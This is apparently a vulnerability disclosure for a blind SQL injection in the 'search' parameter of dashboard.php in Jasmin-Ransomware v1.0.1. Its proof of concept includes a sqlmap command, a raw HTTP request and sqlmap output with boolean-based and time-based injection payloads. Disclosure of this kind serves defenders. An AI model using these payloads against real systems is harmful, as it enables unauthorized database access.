# SQLi vulnerability in Jasmin-Ransomware v1.0.1 of file /dashboard.php with param 'search'

**vender**:

- Jasmin-Ransomware

**SoftLink**:

- [codesiddhant/Jasmin-Ransomware: Jasmin Ransomware is an advanced red team tool (WannaCry Clone) used for simulating real ransomware attacks. Jasmin helps security researchers to overcome the risk of external attacks.](https://github.com/codesiddhant/Jasmin-Ransomware)

**Vulnerable File**

- /dashboard.php

**Version**

- V1.0.1

### POC

```bash
sqlmap -r request.txt -p search --technique BT --level 5 --batch
```



```http
GET /dashboard.php?search=1&pageno=1 HTTP/1.1
Host: www.jasmin.top
Accept-Encoding: gzip, deflate
Referer: http://www.jasmin.top/dashboard.php?search=1&pageno=1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: PHPSESSID=gqgdlhsu3r6nag12j87cfiq3m6
Upgrade-Insecure-Requests: 1
```



```
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=1') AND 3781=3781 AND ('Gxmz' LIKE 'Gxmz&pageno=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: search=1') AND SLEEP(5) AND ('oNUY' LIKE 'oNUY&pageno=1
---
```



![image-20250531044346834](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505310443956.png)